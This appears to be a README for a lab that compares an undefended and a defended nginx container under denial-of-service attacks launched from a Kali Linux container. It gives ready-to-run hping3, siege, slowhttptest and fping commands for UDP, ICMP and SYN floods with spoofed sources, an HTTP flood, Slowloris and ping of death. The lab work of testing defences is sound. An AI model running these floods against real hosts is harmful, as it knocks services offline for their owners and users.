# Tasks
* create attacker Kali linux container (using UDP Flood, ICMP flood, HTTP flood, Slowloris, SYN flood,  Ping of Death attacks)
* create defender container
* measure attacker vs non-defended container and attacker vs properly defended container

# Additional resource
* https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/

# Kali Linux

Used `kalilinux/kali-rolling` see [link](https://www.kali.org/docs/containers/using-kali-docker-images/)

## Udp flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 --flood --rand-source --udp -p 8080 nginx
```

## ICMP flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 --flood --rand-source -1 -p 8080 nginx
```

## HTTP flood
used [siege](https://www.kali.org/tools/siege/)
```
    $ siege -b -c250 -t60s http://nginx:8080
```

## Slowloris attack
used Kali package [slowhttptest](https://www.kali.org/tools/slowhttptest/)
```
    $ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://nginx:8080 -x 24 -p 3
```

## Syn flood
used [hping3](https://www.kali.org/tools/hping3/)
```
    $ hping3 -S --flood -V -p 8080 nginx
```


## Ping of death
used [fping](https://www.kali.org/tools/fping/)
```
    $ fping -b 65510 nginx
```
